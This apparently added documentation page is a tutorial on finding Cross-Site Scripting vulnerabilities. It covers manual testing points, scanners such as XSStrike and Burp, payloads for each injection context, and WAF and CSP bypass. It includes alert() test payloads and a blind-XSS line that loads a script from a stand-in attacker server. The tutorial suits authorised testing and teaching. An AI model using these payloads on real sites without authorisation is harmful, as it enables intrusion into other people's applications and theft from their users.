@@ -1,0 +1,266 @@
+---
+title: XSS Identification Techniques
+description: Methods and approaches for discovering Cross-Site Scripting vulnerabilities in web applications
+---
+
+import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs"
+import { Callout } from "@/components/markdown/callout"
+
+
+Discovering Cross-Site Scripting vulnerabilities requires a systematic approach and understanding of where and how these vulnerabilities typically manifest. This section covers various techniques for identifying XSS vulnerabilities in web applications.
+
+## Manual Testing Approaches
+
+<Tabs defaultValue="input-fields" className="pt-5 pb-1">
+  <TabsList>
+    <TabsTrigger value="input-fields">Input Fields</TabsTrigger>
+    <TabsTrigger value="url-parameters">URL Parameters</TabsTrigger>
+    <TabsTrigger value="headers">HTTP Headers</TabsTrigger>
+    <TabsTrigger value="hidden-fields">Hidden Fields</TabsTrigger>
+  </TabsList>
+  <TabsContent value="input-fields">
+    ### Testing Input Fields
+    
+    Form fields are common entry points for XSS attacks. Test each input field with various payloads:
+    
+    1. Submit simple test strings like `<script>alert('XSS')</script>`
+    2. Check if the input is reflected in the response
+    3. Observe how the application handles special characters
+    4. Test different contexts (text fields, search boxes, comment forms)
+    
+    **Example Test Cases:**
+    - Text inputs: `<script>alert('XSS')</script>`
+    - Numeric fields: Try injecting strings instead of numbers
+    - File uploads: Test filenames with XSS payloads
+    - Rich text editors: Test if HTML filtering can be bypassed
+  </TabsContent>
+  <TabsContent value="url-parameters">
+    ### Testing URL Parameters
+    
+    URL parameters are prime targets for reflected XSS:
+    
+    1. Identify all URL parameters in the application
+    2. Test each parameter with XSS payloads
+    3. Check both GET and POST parameters
+    4. Look for parameters that affect the DOM
+    
+    **Example:**
+    ```
+    https://example.com/search?q=test
+    ```
+    
+    Try:
+    ```
+    https://example.com/search?q=<script>alert('XSS')</script>
+    ```
+    
+    Also test URL fragments (#) as they can trigger DOM-based XSS:
+    ```
+    https://example.com/page#<script>alert('XSS')</script>
+    ```
+  </TabsContent>
+  <TabsContent value="headers">
+    ### Testing HTTP Headers
+    
+    Some applications reflect HTTP header values in the response:
+    
+    1. Test User-Agent, Referer, and other headers
+    2. Use a proxy tool to modify headers
+    3. Check if header values appear in the response
+    
+    **Example with Burp Suite:**
+    ```
+    User-Agent: <script>alert('XSS')</script>
+    Referer: <script>alert('XSS')</script>
+    Cookie: <script>alert('XSS')</script>
+    ```
+  </TabsContent>
+  <TabsContent value="hidden-fields">
+    ### Testing Hidden Fields
+    
+    Hidden form fields can be vulnerable to XSS:
+    
+    1. Identify hidden fields in the HTML source
+    2. Modify their values using browser dev tools
+    3. Submit the form with XSS payloads in hidden fields
+    
+    **Example:**
+    ```html
+    <input type="hidden" name="referrer" value="homepage">
+    ```
+    
+    Change to:
+    ```html
+    <input type="hidden" name="referrer" value="<script>alert('XSS')</script>">
+    ```
+  </TabsContent>
+</Tabs>
+
+## Testing Tools and Automation
+
+Automated tools can help identify XSS vulnerabilities more efficiently:
+
+### Browser Extensions
+
+Several browser extensions can assist with XSS testing:
+
+- **XSS Hunter**: Creates specialized XSS payloads that report back when executed
+- **Hackbar**: Allows quick modification of URL parameters
+- **XSS Rays**: Automatically tests forms for XSS vulnerabilities
+- **DOM Invader**: Specifically targets DOM-based XSS vulnerabilities
+
+These tools provide a convenient way to test for XSS without leaving the browser.
+
+### Proxy Tools
+
+Proxy tools intercept and modify HTTP requests/responses:
+
+- **Burp Suite**: The Active Scanner can automatically detect XSS
+- **OWASP ZAP**: Includes XSS scanning capabilities
+- **Caido**: Modern proxy with XSS testing features
+
+**Using Burp Suite for XSS Testing:**
+1. Capture the request in Burp Proxy
+2. Send to Intruder
+3. Set payload positions at potential injection points
+4. Use a list of XSS payloads
+5. Analyze responses for successful injections
+
+### Specialized XSS Scanners
+
+Dedicated XSS scanning tools:
+
+- **XSStrike**: Advanced XSS detection tool
+- **XSSer**: Framework for XSS vulnerability detection
+- **Dalfox**: Fast XSS scanning tool written in Go
+
+**Example XSStrike Command:**
+```bash
+python xsstrike.py -u "https://example.com/search?q=test"
+```
+
+## Context-Based Testing
+
+Different contexts require different testing approaches:
+
+### HTML Context Testing
+
+When input is reflected directly in HTML body:
+
+```html
+<div>Search results for: USER_INPUT</div>
+```
+
+**Test payloads:**
+```
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+```
+
+### JavaScript Context Testing
+
+When input is reflected inside JavaScript:
+
+```html
+<script>
+  var searchTerm = 'USER_INPUT';
+  document.write("You searched for: " + searchTerm);
+</script>
+```
+
+**Test payloads:**
+```
+';alert('XSS');//
+\';alert('XSS');//
+</script><script>alert('XSS')</script>
+```
+
+### Attribute Context Testing
+
+When input is reflected inside HTML attributes:
+
+```html
+<input type="text" value="USER_INPUT">
+```
+
+**Test payloads:**
+```
+" onmouseover="alert('XSS')"
+" onfocus="alert('XSS')" autofocus="
+" onerror="alert('XSS')" src="x
+```
+
+<Callout type="info" title="Context Matters">
+  Always identify the context where your input is being reflected before crafting payloads. A payload that works in one context may fail in another. Understanding the context is crucial for successful XSS exploitation.
+</Callout>
+
+## XSS Testing Methodology
+
+Follow this systematic approach to thoroughly test for XSS vulnerabilities:
+
+1. **Reconnaissance**
+   - Map the application
+   - Identify all input points
+   - Understand the application's functionality
+
+2. **Input Vector Identification**
+   - List all user inputs (forms, URL parameters, cookies, etc.)
+   - Identify hidden inputs through source code review
+   - Note inputs that are reflected in the response
+
+3. **Initial Testing**
+   - Use simple payloads to test for basic reflection
+   - Check how special characters are handled
+   - Identify filtering or encoding mechanisms
+
+4. **Context Analysis**
+   - Determine where and how inputs are reflected
+   - Identify the context (HTML, JavaScript, attribute, etc.)
+   - Craft context-specific payloads
+
+5. **Bypass Testing**
+   - If filtering is detected, attempt to bypass it
+   - Try different encoding techniques
+   - Use alternative payload formats
+
+6. **Confirmation**
+   - Verify successful XSS with a harmless payload (e.g., `alert()`)
+   - Document the vulnerability
+   - Test impact and exploitability
+
+<Callout type="warning" title="False Positives">
+  Be aware that automated tools often report false positives. Always manually verify reported XSS vulnerabilities before reporting them.
+</Callout>
+
+## Common XSS Testing Challenges
+
+### Content Security Policy (CSP)
+
+Modern applications often implement CSP, which can block XSS attacks:
+
+1. Check if CSP is implemented by examining the `Content-Security-Policy` header
+2. Analyze the policy for weaknesses
+3. Test payloads that might bypass the specific CSP rules
+
+### WAF Bypass Testing
+
+Web Application Firewalls (WAFs) often block common XSS payloads:
+
+1. Use different encoding techniques (HTML, URL, Unicode)
+2. Try case manipulation (`ScRiPt` instead of `script`)
+3. Use alternative payload formats that achieve the same result
+
+### Blind XSS Testing
+
+Some XSS vulnerabilities only manifest in areas you can't directly see:
+
+1. Use payloads that call back to a server you control
+2. Tools like XSS Hunter can generate specialized payloads
+3. Test admin panels, logs, and other areas where input might be viewed by others
+
+```html
+<script src="https://yourserver.com/xss.js"></script>
+```
+
+In the next section, we'll explore exploitation strategies for confirmed XSS vulnerabilities.
